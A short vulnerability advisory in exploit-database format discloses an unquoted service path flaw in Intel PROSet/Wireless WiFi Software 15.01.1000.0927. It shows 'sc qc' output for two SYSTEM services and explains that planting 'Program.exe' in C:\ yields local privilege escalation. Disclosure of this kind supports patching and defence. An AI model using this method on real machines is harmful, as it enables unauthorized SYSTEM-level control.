# Exploit Title: Intel(R) PROSet/Wireless WiFi Software - Unquoted Service Path Privilege Escalation
# Date: 10/19/2016
# Exploit Author: Joey Lane
# Version: 15.01.1000.0927
# Tested on: Windows 7 Professional

The Intel(R) PROSet/Wireless WiFi Software installs 2 services with unquoted service paths.
This enables a local privilege escalation vulnerability.
To exploit this vulnerability, a local attacker can insert an executable file in the path of either service.
Rebooting the system or restarting either service will run the malicious executable with elevated privileges.

This was tested on version 15.01.1000.0927, but other versions may be affected as well.


---------------------------------------------------------------------------

C:\>sc qc EvtEng

[SC] QueryServiceConfig SUCCESS



SERVICE_NAME: EvtEng

        TYPE               : 10  WIN32_OWN_PROCESS

        START_TYPE         : 2   AUTO_START

        ERROR_CONTROL      : 1   NORMAL

        BINARY_PATH_NAME   : C:\Program Files\Intel\WiFi\bin\EvtEng.exe

        LOAD_ORDER_GROUP   :

        TAG                : 0

        DISPLAY_NAME       : Intel(R) PROSet/Wireless Event Log

        DEPENDENCIES       :

        SERVICE_START_NAME : LocalSystem


C:\>sc qc RegSrvc

[SC] QueryServiceConfig SUCCESS



SERVICE_NAME: RegSrvc

        TYPE               : 10  WIN32_OWN_PROCESS

        START_TYPE         : 2   AUTO_START

        ERROR_CONTROL      : 1   NORMAL

        BINARY_PATH_NAME   : C:\Program Files\Common Files\Intel\WirelessCommon\RegSrvc.exe

        LOAD_ORDER_GROUP   :

        TAG                : 0

        DISPLAY_NAME       : Intel(R) PROSet/Wireless Registry Service

        DEPENDENCIES       : RPCSS

        SERVICE_START_NAME : LocalSystem

---------------------------------------------------------------------------


EXAMPLE:

Using the BINARY_PATH_NAME listed above as an example, an executable named
"Program.exe" could be placed in "C:\", and it would be executed as the
Local System user next time the service was restarted.